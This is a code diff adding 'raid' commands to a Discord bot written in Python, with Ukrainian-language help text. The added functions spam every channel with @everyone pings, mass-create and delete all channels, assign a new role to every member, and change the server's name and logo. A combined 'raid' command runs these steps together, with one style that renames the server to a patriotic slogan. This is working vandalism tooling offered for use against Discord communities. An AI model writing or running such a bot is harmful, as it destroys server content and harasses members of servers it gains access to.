@@ -125,5 +125,148 @@ async def github(ctx):
 
     await ctx.send(embed = emb)
 
+
+
+#Commands
+#*Raid List
+@client.command( pass_context = True, aliases = ['rlist', 'raidlist'] )
+async def raid_list(ctx):
+    try:
+        await ctx.message.delete()     
+    except Exception as e:
+            await ctx.channel.send(f'*У бота немає прав адміністатора (в такому разі функції рейду будуть недоступні)*')
+    finally:
+        emb = discord.Embed(title = 'Рейд', description = '*Всі функція для рейду*', color = 0xCD5C5C)
+
+        emb.add_field(name='Фулл Рейд', value = '**{}raid** ``кількість циклів`` ``текст`` ``(style)``'.format(prefix))
+        emb.add_field(name='Спам', value ='**{}spam** ``кількість повідомлень`` ``текст``'.format(prefix))
+        emb.add_field(name='Видалення каналів', value ='**{}delchannels** ``тип каналів (voice або text або all)``'.format(prefix))
+        emb.add_field(name='Створення текстових каналів', value ='**{}createchannels** ``кількість каналів`` ``ім\'я каналів`` ``тип каналів``'.format(prefix))
+        emb.add_field(name='Кік усіх учасників (не працює)', value ='**{}kickall**'.format(prefix))
+        emb.add_field(name='Змінює ніки у всіх учасниках (не працює)', value='**{}changenick** ``нік``'.format(prefix))
+        emb.add_field(name='Створює роль та видає її усім учасникам', value='**{}createrole** ``назва ролі``'.format(prefix))
+        emb.add_field(name='Змінює назву серверу', value='**{}guildname** ``назва``'.format(prefix))
+        emb.add_field(name='Змінює лого серверу', value='**{}guildlogo**'.format(prefix))
+
+        #emb.add_field(name='Туторіал по використанню', value = 'https://youtu.be/jiF_oMV07Zs')
+
+        emb.set_author(name=f'{client.user.name}', icon_url=f'{client.user.avatar_url}')
+        emb.set_footer(text=f'{ctx.message.author.name}', icon_url = ctx.message.author.avatar_url)
+        await ctx.channel.send(embed = emb)
+
+#*Spam
+@client.command( pass_context = True )
+async def spam(ctx, amount: int, *, text):
+    try:
+        for channels in ctx.guild.text_channels:
+            for i in range(amount):
+                await channels.send(f'**{text}**')
+    except Exception as e:
+        await ctx.channel.send(f'{e}')
+
+#*Createchannels
+@client.command()
+async def createchannels(ctx, count: int, name: str, type: str):
+    try:
+        if type == 'text':
+            for i in range(count):
+                await ctx.guild.create_text_channel(name)
+        elif type == 'voice':
+            for i in range(count):
+                await ctx.guild.create_voice_channel(name)
+        elif type == 'all':
+            for i in range(count):
+                await ctx.guild.create_text_channel(name)
+                await ctx.guild.create_voice_channel(name)
+
+    except Exception as e:
+        await ctx.send(e)
+
+#*DeleteChannels
+@client.command()
+async def delchannels(ctx, type: str):
+    try:
+        if type == 'all':
+            for channel in ctx.guild.channels:
+                await channel.delete()
+        elif type == 'text':
+            for channel in ctx.guild.text_channels:
+                await channel.delete()
+        elif type == 'voice':
+            for channel in ctx.guild.voice_channels:
+                await channel.delete()
+
+    except Exception as e:
+        await ctx.send(e)
+
+#*CreateRole
+@client.command()
+async def createrole(ctx, name):
+    try:
+        role = await ctx.guild.create_role(name=name, color = discord.Colour(0x800080))
+        for member in ctx.guild.members:
+            await member.add_roles(role)
+
+    except Exception as e:
+        await ctx.send(e)
+
+#*GuildName
+@client.command()
+async def guildname(ctx, *, name):
+    try:
+        await ctx.guild.edit(name=name)
+
+    except Exception as e:
+        await ctx.send(e)
+
+#*GuildLogo
+@client.command()
+async def guildlogo(ctx):
+    try:
+        with open('logo.png', 'rb') as f:
+            icon = f.read()
+        await ctx.guild.edit(icon = icon)
+    except Exception as e:
+        await ctx.send(e)
+
+#*FullRaid
+@client.command()
+async def raid(ctx, amount: int, text: str, style: str = None):
+    try:
+        if style == None:
+            guild = ctx.guild
+            with open('logo.png', 'rb') as f:
+                icon = f.read()
+
+            await guild.edit(name=text, icon=icon)
+            for i in range(amount):
+                await guild.create_text_channel(text)
+                await guild.create_voice_channel(text)
+                for ch in guild.text_channels:
+                    await ch.send(text)
+                    await ch.send('@everyone')
+                for member in guild.members:
+                    role = await guild.create_role(name=text, color = discord.Colour(0x800080))
+                    await member.add_roles(role)
+
+        elif style == 'ukraine' or style == 'ukrainian': 
+            guild = ctx.guild
+            with open('ua-logo.jpg', 'rb') as f:
+                icon = f.read()
+
+            await guild.edit(name='Слава Україні!', icon=icon)
+            for i in range(amount):
+                await guild.create_text_channel(text)
+                await guild.create_voice_channel(text)
+                for ch in guild.text_channels:
+                    await ch.send(text)
+                    await ch.send('@everyone')
+                for member in guild.members:
+                    role = await guild.create_role(name=text, color = discord.Colour(0x800080))
+                    await member.add_roles(role)
+
+    except Exception as e:
+        await ctx.send(e)
+
 token = open('token.txt', 'r').read()
 client.run(token)
